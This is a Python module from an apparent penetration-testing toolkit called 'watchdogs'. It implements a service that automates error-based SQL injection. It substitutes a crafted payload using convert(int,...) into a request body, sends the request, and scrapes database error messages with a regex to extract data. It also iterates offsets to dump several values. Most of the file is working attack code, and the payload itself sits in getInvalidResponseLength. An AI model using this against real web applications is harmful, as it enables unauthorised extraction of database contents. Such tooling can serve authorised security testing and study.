# author: WatchDogOblivion
# description: TODO
# WatchDogs Error SQL Request Response Service
# pylint: disable=R0904

import re
import sys

from watchdogs.base.models import AllArgs # pylint: disable=unused-import
from watchdogs.utils import GeneralUtility
from watchdogs.web.models import ErrorSQLIRRHelper # pylint: disable=unused-import
from watchdogs.web.models.Requests import Request # pylint: disable=unused-import
from watchdogs.web.parsers import ErrorSQLIArgs
from watchdogs.web.services import RequestResponseService
from watchdogs.web.webutils import ErrorSQLIRRQueries

LIMIT = 30

class ErrorSQLIRRService(RequestResponseService):

  @staticmethod
  def updateRequestBodyString(request, query):
    # type: (Request, str) -> Request
    rbs = request.getRequestBodyString().replace("FUZZ", query)
    request.setRequestBodyString(rbs)
    return request

  def getInvalidResponseLength(self, allArgs, request):
    # type: (AllArgs, Request) -> int
    errorSQLIArgs = allArgs.getArgs(ErrorSQLIArgs)
    query = "{0},convert(int,(''))){1}"
    query = query.format(errorSQLIArgs.terminator, errorSQLIArgs.commentOut)
    query = GeneralUtility.urlEncode(query)

    response = self.sendRequest(allArgs, self.updateRequestBodyString(request, query))
    return int(self.getFinalResponse(response).getResponseLength())

  def processSimpleRequest(self, allArgs, request, helper):
    #type: (AllArgs, Request, ErrorSQLIRRHelper) -> bool
    request.setRequestBodyString(helper.getOriginalRequestBodyString())
    ErrorSQLIRRQueries().setQuery(allArgs, helper)
    self.updateRequestBodyString(request, helper.getQuery())
    helper.setResponseView(None)
    response = self.sendRequest(allArgs, request)
    if (response is not None):
      responsePartsArray = response.text.split("\n")
      for responsePart in responsePartsArray:
        if (allArgs.getArgs(ErrorSQLIArgs).extractString in responsePart):
          REGEX = ".*'(.*)'.*"
          responseView = re.search(REGEX, responsePart).group(1)
          helper.setResponseView(responseView)
      return bool(helper.getResponseView())
    return False

  def processComplexRequest(self, allArgs, request, helper):
    #type: (AllArgs, Request, ErrorSQLIRRHelper) -> None
    index = 0
    responseView = []
    while (True):
      helper.setQueryOffset(index)
      continueProcessing = self.processSimpleRequest(allArgs, request, helper)
      if (not continueProcessing):
        break
      responseView.append(helper.getResponseView())
      index += 1
      if (index > LIMIT):
        print("limit reached")
        sys.exit()
    helper.setResponseView(responseView)
